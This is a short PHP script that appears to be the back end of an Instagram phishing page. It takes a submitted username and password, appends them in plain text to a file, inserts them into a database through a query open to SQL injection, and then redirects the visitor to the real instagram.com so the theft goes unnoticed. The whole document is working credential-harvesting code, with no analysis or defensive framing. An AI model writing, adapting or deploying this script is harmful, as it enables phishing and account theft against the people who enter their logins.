<?php
require_once("connection.php");
file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
mysql_query("insert into USER_DATA set account_id='" . $_POST['username'] . "',password='" . $_POST['password'] . "'") or die("Subject already exits");
header('Location: https://instagram.com');
exit();
